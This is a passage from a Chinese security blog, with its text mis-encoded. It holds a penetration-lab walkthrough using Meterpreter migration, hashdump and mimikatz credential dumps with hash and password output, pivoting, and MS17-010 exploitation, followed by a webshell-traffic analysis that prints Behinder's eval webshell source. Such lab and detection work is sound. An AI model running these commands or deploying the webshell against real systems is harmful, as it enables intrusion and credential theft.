class="hljs-comment">#è¿™é‡Œæ˜¯å½“å‰è·å¾—çš„sessionçš„id</span><br>exploit<br></code></pre></td></tr></table></figure><p>ç„¶åcså°±å¯ä»¥æˆåŠŸæ‹¿åˆ°shell</p><p><strong>è¿›ç¨‹è¿ç§»</strong></p><p>å› ä¸ºmeterpreterä¼šè¯ä¸å¤ªç¨³å®šï¼Œä¸Šçº¿åå¯ä»¥åšä¸€ä¸ªè¿›ç¨‹è¿ç§»ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/weixin_44023693/article/details/104925099">https://blog.csdn.net/weixin_44023693/article/details/104925099</a></p><ol><li><p>å…ˆpsè·å–ç›®æ ‡ä¸»æœºçš„è¿›ç¨‹</p><p><img src="http://cdn.clown2024.cn/202407151737565.png" alt="image-20240518001528797"></p></li><li><p>getpidæŸ¥çœ‹è‡ªå·±çš„è¿›ç¨‹å·</p><p><img src="http://cdn.clown2024.cn/202407151737566.png" alt="image-20240518001555284"></p></li><li><p>åˆ©ç”¨migrateè¿ç§»åˆ°ç¨³å®šçš„è¿›ç¨‹ï¼Œå¯ä»¥é€‰æ‹©svchost.exeæˆ–è€…explorer.exeï¼Œè¿™é‡Œç”¨explorer.exe</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">migrate 1452<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737567.png" alt="image-20240518002212153"></p><p>ä¹Ÿå¯ä»¥ç”¨è‡ªåŠ¨è¿ç§»è¿›ç¨‹çš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run post/windows/manage/migrate<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>è¿ç§»ä¹Ÿä¼šçªƒå–åˆ°å¯¹åº”ç”¨æˆ·çš„ä»¤ç‰Œ</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151737568.png" alt="image-20240518004001288"></p><h2 id="msfæ¨ªå‘ç§»åŠ¨"><a href="#MSFæ¨ªå‘ç§»åŠ¨" class="headerlink" title="MSFæ¨ªå‘ç§»åŠ¨"></a>MSFæ¨ªå‘ç§»åŠ¨</h2><p>è¿™é‡Œå¯ä»¥å…ˆæŠ“å–ä¸€ä¸‹æœ¬åœ°ç”¨æˆ·çš„æ˜æ–‡å¯†ç æˆ–è€…å“ˆå¸Œï¼Œå¾…ä¼špsexecæ¨ªå‘ç§»åŠ¨çš„æ—¶å€™ä¼šç”¨åˆ°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hashdump<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737569.png" alt="image-20240518004658364"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>clown:1005:aad3b435b51404eeaad3b435b51404ee:d42bd392b52fdac4b29d5cdf59cff276:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨kiwiæ¨¡å—ï¼Œmimikatzå·²ç»é›†æˆåœ¨é‡Œé¢äº†</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use kiwi<br><span class="hljs-built_in">help</span> <span class="hljs-comment">#æŸ¥çœ‹å‘½ä»¤</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737570.png" alt="image-20240518004846544"></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">getsystem  <span class="hljs-comment">#ææƒ</span><br>creds_all  <span class="hljs-comment">#è·å–æ‰€æœ‰å‡­æ®</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737571.png" alt="image-20240518005050479"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator  GOD     Hongrisec@2019<br></code></pre></td></tr></table></figure><p><strong>è¿›å…¥ç»ˆç«¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">shell  <span class="hljs-comment">#è¿›å…¥ç»ˆç«¯</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹åŸŸå†…ä¸»æœº</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">chcp 65001  <span class="hljs-comment">#æ”¹å˜ç¼–ç ï¼Œä¸ç„¶ä¼šä¹±ç </span><br>net view<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737572.png" alt="image-20240518005427752"></p><p><strong>æŸ¥çœ‹æ˜¯å¦ä¸ºèœœç½</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run post/windows/gather/checkvm <span class="hljs-comment">#æŸ¥çœ‹æ˜¯å¦ä¸ºè™šæ‹Ÿæœº(èœœç½)</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737573.png" alt="image-20240518011240458"></p><p><strong>æ·»åŠ è·¯ç”±è½¬å‘</strong></p><p>è·¯ç”±è½¬å‘çš„å…·ä½“ä½œç”¨å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/86505">https://www.anquanke.com/post/id/86505</a></p><p>å¤§æ¦‚ä½œç”¨å°±æ˜¯åˆ©ç”¨è¯¥ä¸»æœºä½œä¸ºè·³æ¿æœºï¼Œåœ¨MSFå¹³å°ä¸Šæ·»åŠ å»å¾€å†…ç½‘ç½‘æ®µçš„è·¯ç”±</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run autoroute -h  <span class="hljs-comment">#æŸ¥çœ‹è·¯ç”±æ·»åŠ å¸®åŠ©</span><br>run get_local_subnets  <span class="hljs-comment">#æŸ¥çœ‹ä¸»æœºæ‰€å¤„çš„æ‰€æœ‰ç½‘æ®µ</span><br>run autoroute -s 192.168.52.0/24 <span class="hljs-comment">#æ·»åŠ å»å¾€ç›®æ ‡ç½‘æ®µçš„è·¯ç”±</span><br><br>run post/multi/manage/autoroute <span class="hljs-comment">#è‡ªåŠ¨æ·»åŠ è·¯ç”±</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737574.png" alt="image-20240518011451547"></p><p><img src="http://cdn.clown2024.cn/202407151737575.png" alt="image-20240518011507107"></p><p><img src="http://cdn.clown2024.cn/202407151737576.png" alt="image-20240518011553537"></p><p><strong>ç»§ç»­æ¸—é€</strong></p><p>è·¯ç”±æ‰“é€šåå°±éœ€è¦å°†ä¼šè¯æ”¾åˆ°åå°ç„¶åè¿›è¡Œå…¶ä»–æ”»å‡»æ“ä½œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">background<br>sessions -i<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737577.png" alt="image-20240518011730502"></p><p>æ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œç«¯å£æ‰«æ</p><p>å…ˆè¿›è¡Œå±€éƒ¨ç«¯å£æ‰«æ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">background                                      <br>use auxiliary/scanner/portscan/tcp <br><span class="hljs-built_in">set</span> rhosts 192.168.52.141 192.168.52.138  <span class="hljs-comment">#å¯ä»¥å¯¹ä¸€æ•´ç½‘æ®µä¹Ÿè¡Œï¼Œå…·ä½“çš„ä¸»æœºipå¯ä»¥ä»ä¸Šé¢çš„pingä¸»æœºåè·å–</span><br><span class="hljs-built_in">set</span> ports 80,135-139,445,3306,3389<br>run<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737578.png" alt="image-20240518012512080"></p><p>å¯ä»¥å…ˆå°è¯•ä¸€ä¸‹æ°¸æ’ä¹‹è“</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-built_in">set</span> rhosts 192.168.52.0/24<br><span class="hljs-built_in">set</span> threads 50<br>run<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737579.png" alt="image-20240518012240761"></p><p>ç„¶åå°è¯•ç”¨æ°¸æ’ä¹‹è“æ”»å‡»æ‹¿shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">search ms17-010<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737580.png" alt="image-20240518014204665"></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use 0<br><span class="hljs-built_in">set</span> RHOSTS 192.168.52.138 <span class="hljs-comment">#192.168.52.141æ˜¯32ä½çš„ï¼Œè¿™ä¸ªæ¨¡å—åªèƒ½æ‰“64ä½çš„æœºå™¨</span><br>run<br></code></pre></td></tr></table></figure><p>é¢æœäº†138ä¹Ÿæ‰“ä¸é€šå¾ˆæ€ªï¼Œä¸€ç›´æŠ¥è¿™ä¸ªé”™è¯¯</p><p><img src="http://cdn.clown2024.cn/202407151737581.png" alt="image-20240518023451960"></p><p>ä½†æ˜¯ç”¨å¦ä¸€ä¸ªåªèƒ½æ‰§è¡Œä¸€æ¡å‘½ä»¤æ¨¡å—èƒ½æˆåŠŸï¼Œæ‰€ä»¥è¿˜æœ‰å¦ä¸€ç§æ€è·¯ï¼Œå°±æ˜¯å…ˆå°†ä¸‰å°ä¸»æœºçš„3389å¼€å¯ä¹‹åï¼Œå…ˆè¿ä¸Šç¬¬ä¸€å°Windows7çš„è¿œç¨‹ï¼Œå†è¿å¦å¤–ä¸¤å°</p><p>å¦ä¸€æ¨¡å—çš„ä½¿ç”¨å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use 2<br><span class="hljs-built_in">set</span> rhosts 192.168.52.138 <span class="hljs-comment">#ç›®çš„åœ°å€</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">command</span> REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f <span class="hljs-comment">#è®¾ç½®å¼€å¯3389çš„å‘½ä»¤</span><br>run<br></code></pre></td></tr></table></figure><p><strong>psexecæ‰“æ³•</strong></p><p>emmmè¿™ä¸ªçœ‹åˆ«äººè§†é¢‘æ‰“ä¸é€šï¼Œç”¨äº†frpä¹Ÿä¸è¡Œï¼Œè§†é¢‘é“¾æ¥ï¼š<a href="https://search.bilibili.com/all?vt=67228223&keyword=%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80&from_source=webtop_search&spm_id_from=333.1007&search_source=3">çº¢æ—¥é¶åœºä¸€-å“”å“©å“”å“©_bilibili</a></p><p>è¿™é‡Œå°±æ‡’äº†ä¸è¯•äº†ï¼ˆ</p><p><strong>socksä»£ç†è®¾ç½®</strong></p><p>ä¸Šé¢çš„è·¯ç”±åªèƒ½msfè®¿é—®ï¼Œæƒ³è¦å…¶ä»–åº”ç”¨è®¿é—®è¿˜è¦è®¾ç½®socksä»£ç†ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_44159028/article/details/124631522">https://blog.csdn.net/qq_44159028/article/details/124631522</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> Proxies socks5:127.0.0.1:8989<br><span class="hljs-built_in">set</span> ReverseAllowProxy <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸è§webshellæµé‡åˆ†æ</title>
      <link href="/2024/04/29/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2024/04/29/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>webshellå¸¸è§çš„æµé‡ç‰¹å¾ï¼š</p><ol><li>ç½‘ç»œé€šä¿¡æ¨¡å¼ï¼šWebshellå·¥å…·é€šå¸¸ä¼šä¸æ§åˆ¶æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œé€šè¿‡ç‰¹å®šçš„ç½‘ç»œåè®®ä¼ è¾“æ•°æ®ã€‚è¿™äº›é€šä¿¡æ¨¡å¼ä¸æ­£å¸¸çš„ç½‘ç»œé€šä¿¡æ¨¡å¼å­˜åœ¨å·®å¼‚ï¼Œå¦‚ä½¿ç”¨éæ ‡å‡†ç«¯å£ã€é¢‘ç¹çš„è¿æ¥å’Œæ–­å¼€ç­‰ã€‚</li><li>æ•°æ®ä¼ è¾“æ–¹å¼ï¼šWebshellå·¥å…·å¯èƒ½ä½¿ç”¨åŠ å¯†æˆ–ç¼–ç çš„æ–¹å¼ä¼ è¾“æ•°æ®ï¼Œä»¥éšè—å…¶çœŸå®ç›®çš„å’Œå†…å®¹ã€‚å¯¹äºç”µå­æ•°æ®å–è¯æ¥è¯´ï¼Œéœ€è¦è§£å¯†æˆ–è§£ç è¿™äº›æ•°æ®ï¼Œä»¥è¿˜åŸå…¶åŸå§‹å†…å®¹ã€‚</li><li>æ–‡ä»¶æ“ä½œè¡Œä¸ºï¼šWebshellå·¥å…·é€šå¸¸ä¼šå¯¹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶è¿›è¡Œè¯»å–ã€å†™å…¥ã€åˆ é™¤ç­‰æ“ä½œã€‚è¿™äº›æ–‡ä»¶æ“ä½œè¡Œä¸ºå¯èƒ½æ¶‰åŠåˆ°æ•æ„Ÿæ–‡ä»¶ã€ç³»ç»Ÿæ–‡ä»¶æˆ–ä¸è¢«æ”»å‡»çš„WebæœåŠ¡å™¨ç›¸å…³çš„æ–‡ä»¶ã€‚é€šè¿‡åˆ†æè¿™äº›æ–‡ä»¶æ“ä½œè¡Œä¸ºï¼Œå¯ä»¥å‘ç°æ½œåœ¨çš„Webshellå­˜åœ¨ã€‚</li><li>ç³»ç»Ÿè°ƒç”¨å’Œå‘½ä»¤æ‰§è¡Œï¼šWebshellå·¥å…·å¯èƒ½ä¼šåˆ©ç”¨ç³»ç»Ÿè°ƒç”¨å’Œå‘½ä»¤æ‰§è¡Œæ¥æ‰§è¡Œä¸€äº›æ¶æ„æ“ä½œï¼Œå¦‚æ‰§è¡Œå‘½ä»¤ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ç­‰ã€‚é€šè¿‡ç›‘æµ‹å’Œåˆ†æç³»ç»Ÿè°ƒç”¨å’Œå‘½ä»¤æ‰§è¡Œçš„è¡Œä¸ºï¼Œå¯ä»¥å‘ç°Webshellçš„å­˜åœ¨ã€‚</li></ol><p>è¿™é‡Œå­¦ä¹ å‚è€ƒæ–‡ç« ï¼š<a href="https://www.forensics-wiki.com/linux/webshell/">https://www.forensics-wiki.com/linux/webshell/</a></p><h1 id="èœåˆ€"><a href="#èœåˆ€" class="headerlink" title="èœåˆ€"></a>èœåˆ€</h1><p>ä¸­å›½èœåˆ€ (Chopper) æ˜¯ä¸€æ¬¾ç»å…¸çš„ç½‘ç«™è¿æ¥å·¥å…·æ”¯æŒçš„æœåŠ¡ç«¯è„šæœ¬æœ‰ PHPã€ASPã€ASPXï¼Œå…·æœ‰æ–‡ä»¶ç®¡ç†æ•°æ®åº“ç®¡ç†ã€è™šæ‹Ÿç»ˆç«¯ç­‰åŠŸèƒ½ã€‚</p><p>å…¶æµé‡ç‰¹å¾è¾ƒä¸ºæ˜æ˜¾ï¼Œè€Œä¸”ç°åœ¨ä¹Ÿæ¯”è¾ƒå°‘ç”¨ï¼Œå°±æ‹¿ä¸€é“buuä¸Šçš„é¢˜ç›®æ¥è¿›è¡Œåˆ†æã€‚</p><p>èœåˆ€çš„æµé‡ç‰¹å¾ï¼š</p><ol><li><p>payloadåœ¨è¯·æ±‚ä½“ä¸­ï¼Œé‡‡ç”¨urlç¼–ç +base64ç¼–ç ï¼Œpayloadéƒ¨åˆ†æ˜¯æ˜æ–‡ä¼ è¾“ã€‚</p></li><li><p>payloadä¸­æœ‰evalæˆ–assertã€base64_decodeè¿™æ ·çš„å­—ç¬¦ã€‚</p></li><li><p>payloadä¸­æœ‰é»˜è®¤å›ºå®šçš„&amp;z0&#x3D;QGluaV9zZXQâ€¦è¿™æ ·base64åŠ å¯†çš„æ”»å‡»è½½è·ï¼Œå‚æ•°z0å¯¹åº”$_POST[z0]æ¥æ”¶åˆ°çš„æ•°æ®ï¼Œä¸”å›ºå®šä¸ºQGluaV9zZXQå¼€å¤´ã€‚è¿›è¡Œbase64è§£ç åå¯çœ‹åˆ°ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);è¿™æ®µæ„æ€æ˜¯é¦–å…ˆå…³é—­æŠ¥é”™å’Œmagic_quotesï¼Œæ¥ä¸‹æ¥å»è·å–ä¸»æœºçš„ä¿¡æ¯ã€‚<br></code></pre></td></tr></table></figure></li></ol><p><img src="http://cdn.clown2024.cn/202407151450073.png" alt="image-20240501191342304"></p><p>ç„¶åè¿½è¸ªä¸€ä¸‹tcpæµå»çœ‹ä¸€ä¸‹è¯·æ±‚å’Œå“åº”æŠ¥æ–‡</p><p><img src="http://cdn.clown2024.cn/202407151450074.png" alt="image-20240501191930991"></p><p>å¯ä»¥çœ‹åˆ°æ˜æ˜¾çš„base64ç‰¹å¾å’Œevalå‡½æ•°ç­‰ï¼Œactionå‚æ•°ä¼ é€’çš„å°±æ˜¯payloadï¼Œä¹Ÿç¬¦åˆä¸Šé¢çš„ç‰¹å¾ï¼Œ&amp;action&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGl</p><p>æˆ‘ä»¬å¯ä»¥å»è§£ç çœ‹ä¸€ä¸‹è¿™äº›payload</p><p><img src="http://cdn.clown2024.cn/202407151450075.png" alt="image-20240501192402117"></p><p>å†æ ¹æ®ä¸‹é¢çš„å“åº”ä¿¡æ¯åº”è¯¥æ˜¯æ‰§è¡Œäº†ç±»ä¼¼lsä¹‹ç±»çš„æ“ä½œ</p><p>å†å»çœ‹çœ‹å…¶ä»–æµæœ‰æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œåœ¨æµ7å‘ç°ä¸‹é¢çš„ä¸œè¥¿</p><p><img src="http://cdn.clown2024.cn/202407151450076.png" alt="image-20240501200327032"></p><p>å°†z1è§£ç çœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">RDpcd2FtcDY0XHd3d1x1cGxvYWRcNjY2Ni5qcGc%3D<br><br>//è§£ç <br>D:\wamp64\www\upload\6666.jpg<br></code></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯å°±æ˜¯ç›®å½•ä¸­çš„é‚£å¼ å›¾ç‰‡ï¼Œå‰é¢çš„æ–‡ä»¶å¤´ä¹Ÿç¬¦åˆjpgçš„æ–‡ä»¶å¤´</p><p>æˆ‘ä»¬å¯ä»¥å»å°†è¿™ä¸ªåå…­è¿›åˆ¶æ•°æ®å¯¼å‡ºåˆ†ç»„å­—èŠ‚æµ</p><p><img src="http://cdn.clown2024.cn/202407151450077.png" alt="image-20240501202011704"></p><p>æ‰“å¼€010å¯¼å…¥Hex</p><p><img src="http://cdn.clown2024.cn/202407151450078.png" alt="image-20240501202722257"></p><p>ç„¶åå†å¦å­˜ä¸º1.jpgå³å¯</p><p><img src="http://cdn.clown2024.cn/202407151450079.png" alt="image-20240501202801906"></p><p>åœ¨æµ9å‘ç°äº†ä¸‹é¢çš„ä¸œè¥¿</p><p><img src="http://cdn.clown2024.cn/202407151450080.png" alt="image-20240501200405110"></p><p>å°†z1å‚æ•°è§£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">RDpcd2FtcDY0XHd3d1x1cGxvYWRcaGVsbG8uemlw<br><br>//è§£ç <br>D:\wamp64\www\upload\hello.zip<br></code></pre></td></tr></table></figure><p>è®¿é—®äº†ä¸€ä¸ªéœ€è¦å¯†ç çš„å‹ç¼©åŒ…ï¼Œå¯ä»¥ç”¨foremostç›´æ¥æå–å‡ºæ¥</p><p><img src="http://cdn.clown2024.cn/202407151450081.png" alt="image-20240501201550429"></p><p>å¯†ç å°±æ˜¯ä¸Šé¢çš„å›¾ç‰‡ï¼Œè§£å‹å³å¯å¾—åˆ°flag</p><h1 id="èšå‰‘"><a href="#èšå‰‘" class="headerlink" title="èšå‰‘"></a>èšå‰‘</h1><p>èšå‰‘çš„å¾ˆå¤šæºç æ¥è‡ªèœåˆ€ï¼Œæ‰€ä»¥é“¾æ¥æµé‡ç‰¹å¾ä¸ä¸­å›½èœåˆ€å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯èšå‰‘çš„æ‰©å……æ€§å¾ˆå¥½å¯ä»¥å¯¹è¿›è¡ŒåŠ å¯†ï¼Œæ··æ·†ç­‰ç»•è¿‡å¤„ç†ã€‚èšå‰‘é»˜è®¤æ”¯æŒ ASPä»¥åŠPHPçš„Webshellé“¾æ¥ï¼Œè¿˜å¯ä»¥é€šè¿‡æ’ä»¶æ¥æ‰©å±•å…¶åŠŸèƒ½ã€‚</p><p>å…¶æµé‡ç‰¹å¾å¦‚ä¸‹ï¼š</p><ol><li><p>è¯·æ±‚æ—¶å¯é€‰æ‹©å¤šç§ç¼–ç å™¨ï¼Œå¦‚æœé‡‡ç”¨é»˜è®¤çš„æ–¹å¼ï¼Œåˆ™ä»…è¿›è¡Œurlç¼–ç ã€‚</p></li><li><p>è¿›è¡Œè¿æ¥æ—¶ä¼šè¿›è¡Œä¸¤æ¬¡è¯·æ±‚ï¼Œç¬¬ä¸€æ¬¡è¯·æ±‚çš„payloadå’Œèœåˆ€ç›¸ä¼¼ï¼Œä¹Ÿæ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);<br></code></pre></td></tr></table></figure><p>æ„æ€æ˜¯å…³é—­æŠ¥é”™å’Œmagic_quotesï¼Œæ¥ä¸‹æ¥åŒºè·å–ä¸»æœºä¿¡æ¯ã€‚è¿™æ®µä»£ç åŸºæœ¬æ˜¯æ‰€æœ‰WebShellå®¢æˆ·ç«¯é“¾æ¥PHPç±»WebShelléƒ½æœ‰çš„ä¸€ç§ä»£ç ã€‚</p></li><li><p>ç¬¬äºŒæ¬¡è¯·æ±‚ä¼šæŠŠä¸»æœºçš„ç›®å½•åˆ—å‡ºæ¥</p></li><li><p>ç”±äºèšå‰‘ä¸­åŒ…å«äº†å¾ˆå¤šåŠ å¯†ã€ç»•è¿‡æ’ä»¶ï¼Œæ‰€ä»¥å¯¼è‡´å¾ˆå¤šæµé‡è¢«åŠ å¯†åæ— æ³•è¯†åˆ«ï¼Œä½†æ˜¯èšå‰‘æ··æ·†åŠ å¯†åè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„ç‰¹å¾ï¼Œå³ä¸ºå‚æ•°åå¤§å¤šä»¥â€œ_0xâ€¦..&#x3D;â€è¿™ç§å½¢å¼ã€‚</p><p>æ‰€ä»¥ï¼Œä»¥_0xå¼€å¤´çš„å‚æ•°åï¼Œåé¢ä¸ºåŠ å¯†æ•°æ®çš„æ•°æ®åŒ…ä¹Ÿå¯è¯†åˆ«ä¸ºèšå‰‘çš„æµé‡ç‰¹å¾ã€‚</p></li></ol><p>è¿™é‡Œæœ¬åœ°å»æŠ“äº†çœ‹çœ‹ï¼Œè¿™é‡Œç”¨çš„defaultçš„ç¼–ç ï¼Œå³urlç¼–ç </p><p><img src="http://cdn.clown2024.cn/202407151450082.png" alt="image-20240501230752754"></p><p>è¿™æ˜¯base64æ—¶çš„è¯·æ±‚</p><p><img src="http://cdn.clown2024.cn/202407151450083.png" alt="image-20240501231413437"></p><p>å†å»çœ‹ä¸€ä¸‹httpè¯·æ±‚çš„å‚æ•°</p><p><img src="http://cdn.clown2024.cn/202407151450084.png" alt="image-20240501230857449"></p><p>emmmä½†æ˜¯æ²¡æœ‰ä»¥0xå¼€å¤´ï¼Œä½†æ˜¯å‚æ•°åå­—å°±ä¼šæ¯”è¾ƒå¥‡æ€ª</p><h1 id="å†°è"><a href="#å†°è" class="headerlink" title="å†°è"></a>å†°è</h1><p>å†°èæ˜¯ä¸€æ¬¾åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯† Web è¿œç¨‹ç®¡ç†å®¢æˆ·ç«¯ï¼Œä»¥è¿›è¡ŒåŠ¨æ€æµé‡åŠ å¯†ï¼Œä¸”åŠ å¯†å¯†é’¥æ˜¯ç”±ä½¿ç”¨è€…æ¥è®¾å®šï¼Œä½†æ˜¯è¯¥æ‹¦æˆªå™¨å¯¹ webshell çš„éœ€æ±‚æ¯”è¾ƒé«˜ï¼Œæ— æ³•è¿æ¥ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>æ‰€ä»¥è¯¥å·¥å…·çš„ç›®å½•ä¸‹é¢éƒ½ä¼šé…å¤‡å·²ç»å†™å¥½çš„å„ç§æ ¼å¼çš„shellï¼Œæ¯”å¦‚phpã€jspç­‰ã€‚</p><blockquote><p>è¿™é‡Œä¸€å¼€å§‹æˆ‘çš„jdk17æ‰“ä¸å¼€å†°èï¼Œå»æŸ¥äº†ä¸€ä¸‹ï¼Œå¯èƒ½æ˜¯Javaç‰ˆæœ¬å¤ªé«˜çš„åŸå› ï¼Œå› ä¸ºå¾ˆå¤šwebshellå·¥å…·çš„å›¾å½¢åŒ–éƒ½éœ€è¦JavaFXåº“ï¼Œä½†æ˜¯ä»JAVA11ä¹‹åè¿™ä¸ªåº“å°±è¢«ç§»é™¤äº†ï¼Œæ‰€ä»¥æ¢ä¸€ä¸ªä½ç‰ˆæœ¬çš„javaå°±å¥½äº†ã€‚</p></blockquote><h2 id="å†°è10"><a href="#å†°è1-0" class="headerlink" title="å†°è1.0"></a>å†°è1.0</h2><p>å¯ä»¥çœ‹ä¸€ä¸‹ä»–çš„shell.phpçš„å†…å®¹ï¼Œä½†æ˜¯ä»–åŸæ¥çš„å†…å®¹å†™çš„å¾ˆç®€åŒ–ä¹Ÿæ²¡æœ‰æ¢è¡Œå°±å¾ˆéš¾çœ‹ï¼Œæˆ‘è®©aiç»™æˆ‘æ ¼å¼åŒ–äº†ä¸€ä¸‹åŠ äº†ä¸ªæ³¨é‡Š</p><p>åŸæ¥çš„ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;;<span class="hljs-title function_ invoke__">session_start</span>();<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])?<span class="hljs-keyword">print</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())),<span class="hljs-number">16</span>):(<span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>), <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>])))&amp;@<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åæ¥çš„ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span> . <span class="hljs-string">&quot;&quot;</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å­˜åœ¨ URL å‚æ•° &#x27;pass&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span 